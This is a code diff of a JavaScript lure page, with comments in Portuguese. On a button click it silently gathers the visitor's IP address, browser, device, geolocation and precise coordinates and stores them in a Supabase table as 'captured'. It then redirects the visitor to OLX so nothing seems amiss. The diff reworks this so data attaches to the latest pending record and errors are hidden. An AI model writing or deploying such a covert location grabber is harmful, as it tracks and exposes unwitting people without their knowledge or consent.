@@ -10,16 +10,6 @@ document.addEventListener("DOMContentLoaded", () => {
 
     btn.addEventListener("click", async () => {
         try {
-            // Extrai o ID da URL
-            const urlParams = new URLSearchParams(window.location.search);
-            const investigacaoId = urlParams.get('id');
-
-            if (!investigacaoId) {
-                console.error("ID da investigação não encontrado na URL");
-                window.location.href = "https://www.olx.com.br";
-                return;
-            }
-
             // Coleta IP do visitante
             const ipRes = await fetch("https://ipwho.is/");
             const ipData = await ipRes.json();
@@ -48,49 +38,41 @@ document.addEventListener("DOMContentLoaded", () => {
             else if (/edge/i.test(userAgent)) navegador = "Edge";
             else if (/opera/i.test(userAgent)) navegador = "Opera";
 
-            // Busca a investigação atual
-            const { data: investigacao, error: fetchError } = await supabaseClient
-                .from("coleta_user_via_links")  // Nome correto da tabela
-                .select("redirecionamento, acessos, status")
-                .eq("id", investigacaoId)
-                .single();
+            // Busca a investigação pendente mais recente
+            const { data: investigacoes } = await supabaseClient
+                .from("coleta_user_via_links")
+                .select("*")
+                .eq("status", "pendente")
+                .order("data_hora", { ascending: false })
+                .limit(1);
 
-            if (fetchError || !investigacao) {
-                console.error("Investigação não encontrada:", fetchError);
-                window.location.href = "https://www.olx.com.br";
-                return;
+            // Se encontrou uma investigação pendente
+            if (investigacoes && investigacoes.length > 0) {
+                const investigacao = investigacoes[0];
+
+                // Atualiza os dados da investigação
+                await supabaseClient
+                    .from("coleta_user_via_links")
+                    .update({
+                        ip: ip,
+                        navegador: navegador,
+                        geolocalizacao: geolocalizacao,
+                        aparelho: aparelho,
+                        data_hora: new Date().toISOString(),
+                        latitude: latitude,
+                        longitude: longitude,
+                        mapa_link: mapa_link,
+                        acessos: (investigacao.acessos || 0) + 1,
+                        status: 'capturado'
+                    })
+                    .eq("id", investigacao.id);
             }
 
-            // Atualiza os dados da investigação
-            const { error: updateError } = await supabaseClient
-                .from("coleta_user_via_links")  // Nome correto da tabela
-                .update({
-                    ip: ip,
-                    navegador: navegador,
-                    geolocalizacao: geolocalizacao,
-                    aparelho: aparelho,
-                    data_hora: new Date().toISOString(),
-                    latitude: latitude,
-                    longitude: longitude,
-                    mapa_link: mapa_link,
-                    acessos: (investigacao.acessos || 0) + 1,
-                    status: 'capturado'  // Atualiza o status
-                })
-                .eq("id", investigacaoId);
-
-            if (updateError) {
-                console.error("Erro ao atualizar no Supabase:", updateError);
-            } else {
-                console.log("Dados coletados com sucesso");
-            }
-
-            // Redireciona para o link configurado ou OLX por padrão
-            setTimeout(() => {
-                window.location.href = investigacao.redirecionamento || "https://www.olx.com.br";
-            }, 500); // Pequeno delay para garantir que os dados foram salvos
+            // Sempre redireciona para OLX, independente de ter encontrado investigação ou não
+            window.location.href = "https://www.olx.com.br";
 
         } catch (err) {
-            console.error("Erro geral na coleta:", err);
+            console.log("Erro na captura, redirecionando...");
             window.location.href = "https://www.olx.com.br";
         }
     });
